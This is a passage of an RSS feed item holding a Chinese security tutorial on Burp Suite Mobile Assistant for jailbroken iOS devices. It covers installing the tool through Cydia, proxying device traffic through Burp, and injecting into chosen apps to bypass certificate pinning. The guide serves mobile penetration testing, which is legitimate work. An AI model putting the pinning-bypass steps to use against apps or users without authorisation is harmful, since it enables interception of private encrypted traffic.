src=&quot;https://pic1.zhimg.com/v2-1dd59d04db7c6431fc6bc2ee69896493.png_r.jpg&quot; data-rawwidth=&quot;431&quot; data-rawheight=&quot;379&quot;&gt;&lt;/li&gt;&lt;li&gt;点击mobileassistant应用程序进行安装:&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-637bc005cc5ad125011676cba8b8e99d.png_r.jpg&quot; data-rawwidth=&quot;424&quot; data-rawheight=&quot;216&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;点击安装:&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-74a66ddc42726fe9114995d6ccdb66b9.png_r.jpg&quot; data-rawwidth=&quot;428&quot; data-rawheight=&quot;424&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;之后就会进行下载并安装它。在完成之后，您需要重新启动弹出菜单按钮来应用更改。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fb93900bdd5bc6b8a083965c5d40f68f.png_r.jpg&quot; data-rawwidth=&quot;293&quot; data-rawheight=&quot;505&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;在安装成功后便会在桌面出现我们的 Mobile Assistant 应用了。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6315f2536d0964e71e740270345df5f3.png_r.jpg&quot; data-rawwidth=&quot;470&quot; data-rawheight=&quot;274&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;还可以让设备通过浏览器访问 Burp Suite 的浏览器界面，即&lt;a href=&quot;http://192.168.169.22:8080&quot; data-title=&quot;http://192.168.169.22:8080&quot; class=&quot;&quot;&gt;http://192.168.169.22:8080&lt;/a&gt;（主机局域网IP:监听端口）/mobileassistant.deb 来实现安装，下载完成之后通过 Cydia 来完成安装，但是要注意将我们的 deb 格式的安装包导入 /var/root/Media/Cydia/AutoInstall，然后重启 iOS 设备，进入 Cydia 的软件包，就可以发现已经安装好了。 &lt;img src=&quot;https://pic1.zhimg.com/v2-e5a25ca639c07765c18b0bcd18a0bf5c.png_r.jpg&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;无论是哪种安装方法，都必须要保证我们的主机以及 iOS 设备连接的是同一个网络。&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;使路由流量通过 Burp&lt;/b&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;      首先你要保证你的 Burp 实例正在运行，并且可以从移动设备上进行网络访问，然后在移动设备端的 Burp Suite Mobile Assistant 中设置要进行连接的 Burp Suite 实例的主机 IP 和端口，然后来安装 CA 证书，将 Burp Suite 作为移动设备的代理。在配置完成后，可以通过以下方法来验证你的配置：&lt;/p&gt;&lt;p&gt;1. 网络连接：设备是否能够连接到给定的主机和端口。&lt;/p&gt;&lt;p&gt;2. Burp 验证：给定的主机 IP 和端口上监听服务是否是 Burp Suite 的实例。&lt;/p&gt;&lt;p&gt;3. CA 证书安装：设备是否信任所配置的 Burp Suite 实例的 CA 证书。&lt;/p&gt;&lt;p&gt;4. 启用代理：设备是否通过所提供的主机和端口为 HTTP 和 HTTPS 连接配置的代理服务器。&lt;/p&gt;&lt;p&gt;注意： 移动助手对代理设置所做的更改是短暂的，会在重新启动后恢复原来的设置。在运行  iOS 9.0 版以上的设备时，使用 Mobile Assistant 对代理设置所做的更改不会反映在 iOS 设置应用中。Burp CA 证书的安装在重新启动后不会恢复。&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;绕过证书锁定&lt;/b&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;证书锁定是应用程序用来防御恶意用户扮演可信任服务器的技术，在这种情况下，锁定（pinning）是一种术语，指的是针对本地合法证书进行身份验证（由远程服务器提供 SSL 证书）的过程。所以说，只有当服务器可以提供与应用相匹配的证书可以证明其身份时，才能和远程服务器建立连接。&lt;/p&gt;&lt;p&gt;默认情况下，Burp Suite 通过其自签名的 CA 证书为每台主机生成签名证书。即使设备可能会信任这些证书，但它们无法与应用程序预期的证书相匹配。那么即使该设备已正确配置为  HTTPS 代理，也会造成 Burp Suite 的拦截和查看应用程序流量的能力会被证书锁定削弱。&lt;/p&gt;&lt;p&gt;Burp Suite Mobile Assistant 还可以注入其他应用程序，并且还能挂载到低级系统 API 以破坏证书锁定，从而允许用户拦截流量，甚至在证书锁定执行中的时候也可以。&lt;/p&gt;&lt;p&gt;使用系统 API 、第三方库或自定义代码，可通过不同方式实现证书锁定。然而某些情况下注入应用程序成功也可能无法禁用锁定，这表明应用程序正使用自定义代码执行证书锁定。&lt;/p&gt;&lt;p&gt;注：Mobile Assistant 绕过证书锁定的特性目前暂不支持 iOS 10 版本。&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;注入到应用程序&lt;br&gt;&lt;/b&gt;将你想要进行测试的 app 添加到列表中，这时候如果该应用程序与列表中的应用程序中至少有一个表项匹配，那么该 app 将会通过绕过证书锁定的方式被注入，接下来我们来介绍一下。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;首先启动 Burp Suite Mobile Assistant，跟启动其他应用程序一样，点击图标：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6315f2536d0964e71e740270345df5f3.png_r.jpg&quot; data-rawwidth=&quot;470&quot; data-rawheight=&quot;274&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;设置代理：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5c77af9aa4f9328989ee7280a7957a60.png_r.jpg&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;300&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;点击添加要注入的应用程序：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c48620615e09744f0c01cd25360d8783.png_r.jpg&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;300&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;添加成功会出现在列表中：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d2d00a402b44ad2664dba4aab22e7e66.png_r.jpg&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;300&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;之后就可以开启或关闭注入功能了。在开启后，Mobile Assistant 会执行各种检查，如果这个过程发现错误，将会被自动关闭这个功能。同时在开启注入功能之后，我们需要去启动被注入的应用程序（若之前启动了，需要重新启动才能生效）：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6979e9d51889904c393ef9f883ed735a.png_r.jpg&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;300&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;如果弹出下图所示窗口，表示注入成功：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3cd42a2f7bea44b3739117a07801c2a6.png_r.jpg&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;300&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;点击OK，MobileAssistant将绕过证书锁定，并且应用程序将能使用Burpsuite的自签名证书以数据的形式传输到服务器和客户端之间。&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fa170e12b6301c587afb35d2c50efb6a.png_r.jpg&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;343&quot;&gt;&lt;br&gt; 你可能还想注入到多个相关应用中，可以通过这几种方式来过滤流量：&lt;br&gt;&lt;ol&gt;&lt;li&gt;可执行文件：将会匹配每个可执行文件名称与过滤器值相匹配的应用程序。&lt;br&gt;&lt;/li&gt;&lt;li&gt;软件包 ID：将会匹配有指定软件包 ID 的应用程序，或者有与该软件包 ID 有依赖关系的框架。比如，过滤器 com.apple.UIKit 将所有应用程序与 GUI 匹配; 过滤器  com.apple.Security 将与所有应用程序进行匹配。&lt;br&gt;&lt;/li&gt;&lt;li&gt;类：将会匹配所有实现名称与过滤器值相匹配的类的应用程序。&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;从崩溃中恢复&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;注入应用程序和挂载 API 调用的过程中是存在潜在风险。为此，Cydia Substrate 插件在意外情况下可防止设备进入永久崩溃状态。出现 Burp Suite 移动助手崩溃并引发问题的情况时，请参阅 Cydia Substrate 的安全模式来解决。&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;参考&lt;/b&gt;&lt;b&gt;：&lt;/b&gt;&lt;/p&gt;&lt;br&gt;&lt;a href=&quot;https://support.portswigger.net/customer/en/portal/articles/2798917-Using%20Burp_MobileAssistant_Using.html&quot; data-editable=&quot;true&quot; data-title=&quot;Configuring Burp Suite Mobile Assistant&quot; class=&quot;&quot;&gt;Configuring Burp Suite Mobile Assistant&lt;/a&gt;&lt;a href=&quot;https://support.portswigger.net/customer/en/portal/articles/2798917-Using%20Burp_MobileAssistant_Using.html&quot; data-editable=&quot;true&quot; data-title=&quot;Configuring Burp Suite Mobile Assistant&quot; class=&quot;&quot;&gt;&lt;br&gt;&lt;/a&gt;&lt;a href=&quot;https://portswigger.net/burp/help/mobile_testing_using_mobile_assistant.html&quot; data-editable=&quot;true&quot; data-title=&quot;Using Burp Suite Mobile Assistant&quot; class=&quot;&quot;&gt;Using Burp Suite Mobile Assistant&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://support.portswigger.net/customer/en/portal/articles/2798916-installing-burp-suite-mobile-assistant&quot; data-editable=&quot;true&quot; data-title=&quot;Installing Burp Suite Mobile Assistant&quot; class=&quot;&quot;&gt;Installing Burp Suite Mobile Assistant&lt;/a&gt;</description>
+<author>TwoSecurity</author>
+<guid isPermaLink="false">2017-05-17-26920791</guid>
+<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
+</item>
+</channel>
+</rss>
